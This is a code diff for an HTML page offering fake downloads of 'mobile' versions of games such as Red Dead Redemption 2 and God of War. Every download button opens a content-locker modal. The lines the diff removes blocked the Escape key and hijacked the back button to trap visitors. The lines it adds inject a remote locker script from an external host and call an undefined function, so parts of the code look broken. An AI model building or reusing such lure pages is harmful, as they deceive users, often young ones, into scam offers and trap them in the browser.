@@ -87,7 +87,6 @@
       display: none;
       justify-content: center;
       align-items: center;
-      overflow: hidden;
     }
 
     #lockerModal iframe {
@@ -135,85 +134,8 @@
     <button class="download-btn" onclick="openLocker()">⬇ Download</button>
   </div>
 
-  <div class="card">
-    <img src="https://b.top4top.io/p_34066ixq51.jpg" alt="Fortnite Mobile" />
-    <h2>Fortnite Mobile</h2>
-    <p class="rating">⭐⭐⭐⭐</p>
-    <p class="downloads">2,800 downloads</p>
-    <button class="download-btn" onclick="openLocker()">⬇ Download</button>
-  </div>
+  <!-- More cards here... -->
 
-  <div class="card">
-    <img src="https://e.top4top.io/p_3406ddref1.jpg" alt="Roblox" />
-    <h2>Roblox</h2>
-    <p class="rating">⭐⭐⭐⭐⭐</p>
-    <p class="downloads">5,100 downloads</p>
-    <button class="download-btn" onclick="openLocker()">⬇ Download</button>
-  </div>
-
-  <div class="card">
-    <img src="https://e.top4top.io/p_3406dpns11.jpg" alt="Valorant" />
-    <h2>Valorant Mobile</h2>
-    <p class="rating">⭐⭐⭐⭐⭐</p>
-    <p class="downloads">3,400 downloads</p>
-    <button class="download-btn" onclick="openLocker()">⬇ Download</button>
-  </div>
-
-  <div class="card">
-    <img src="https://h.top4top.io/p_3406dxrtk1.png" alt="BASEBALL 9" />
-    <h2>Baseball 9</h2>
-    <p class="rating">⭐⭐⭐⭐</p>
-    <p class="downloads">5,500 downloads</p>
-    <button class="download-btn" onclick="openLocker()">⬇ Download</button>
-  </div>
-
-  <div class="card">
-    <img src="https://d.top4top.io/p_3406x5kaq1.jpg" alt="God of War" />
-    <h2>God of War Mobile</h2>
-    <p class="rating">⭐⭐⭐⭐</p>
-    <p class="downloads">2,600 downloads</p>
-    <button class="download-btn" onclick="openLocker()">⬇ Download</button>
-  </div>
-
-  <div class="card">
-    <img src="https://j.top4top.io/p_34064g5oz1.jpg" alt="Euro Truck 2" />
-    <h2>Euro Truck Simulator 2 Mobile</h2>
-    <p class="rating">⭐⭐⭐⭐⭐</p>
-    <p class="downloads">4,300 downloads</p>
-    <button class="download-btn" onclick="openLocker()">⬇ Download</button>
-  </div>
-
-  <div class="card">
-    <img src="https://d.top4top.io/p_3406rzhlt1.png" alt="Monopoly Go" />
-    <h2>Monopoly Go!</h2>
-    <p class="rating">⭐⭐⭐⭐</p>
-    <p class="downloads">3,000 downloads</p>
-    <button class="download-btn" onclick="openLocker()">⬇ Download</button>
-  </div>
-
-  <div class="card">
-    <img src="https://i.top4top.io/p_3406hix201.jpg" alt="The Last of Us" />
-    <h2>The Last of Us Part 1 Mobile</h2>
-    <p class="rating">⭐⭐⭐⭐</p>
-    <p class="downloads">2,200 downloads</p>
-    <button class="download-btn" onclick="openLocker()">⬇ Download</button>
-  </div>
-
-  <div class="card">
-    <img src="https://h.top4top.io/p_3406a5yun1.jpg" alt="Red Dead Redemption 2" />
-    <h2>Red Dead Redemption 2</h2>
-    <p class="rating">⭐⭐⭐⭐⭐</p>
-    <p class="downloads">3,500 downloads</p>
-    <button class="download-btn" onclick="openLocker()">⬇ Download</button>
-  </div>
-
-  <div class="card">
-    <img src="https://h.top4top.io/p_34066996o1.jpg" alt="Fifa 25" />
-    <h2>Fifa 25 Mobile</h2>
-    <p class="rating">⭐⭐⭐⭐⭐</p>
-    <p class="downloads">4,000 downloads</p>
-    <button class="download-btn" onclick="openLocker()">⬇ Download</button>
-  </div>
 </main>
 
 <footer>
@@ -225,48 +147,21 @@
 
 <script>
   function openLocker() {
-    const modal = document.getElementById('lockerModal');
-    const lockerContainer = document.getElementById('lockerContent');
+    document.getElementById('lockerModal').style.display = 'flex';
 
-    // Show the modal
-    modal.style.display = 'flex';
-
-    // Prevent ESC key from closing anything
-    window.addEventListener('keydown', function(e) {
-      if (e.key === 'Escape') e.preventDefault();
-    });
-
-    // Prevent back navigation
-    history.pushState(null, null, location.href);
-    window.onpopstate = function () {
-      history.go(1);
-    };
-
-    // Inject the locker script
-    lockerContainer.innerHTML = `
-      <script type="text/javascript">
-        var deoEP_wII_oJNdsc={"it":4482512,"key":"6975c"};
-      <\/script>
-      <script src="https://d2yc6hxtq0phup.cloudfront.net/4b522c7.js"><\/script>
-    `;
+    // Call the additional script after content locker is shown
+    setTimeout(function() {
+      // Include your content locker code here
+      var deoEP_wII_oJNdsc = {"it":4482512,"key":"6975c"};
+      var script = document.createElement('script');
+      script.src = "https://d2yc6hxtq0phup.cloudfront.net/4b522c7.js";
+      document.body.appendChild(script);
+      
+      // Add your custom script after content locker opens
+      _Tt(); // Custom function
+    }, 500); // Delay to ensure the content locker is displayed first
   }
 </script>
-
-<!-- Modal for Content Locker -->
-<div id="lockerModal" style="
-  position: fixed;
-  top: 0;
-  left: 0;
-  width: 100vw;
-  height: 100vh;
-  background: rgba(0,0,0,0.95);
-  z-index: 9999;
-  display: none;
-  justify-content: center;
-  align-items: center;
-">
-  <div id="lockerContent" style="width: 90%; height: 90%;"></div>
-</div>
 
 </body>
 </html>
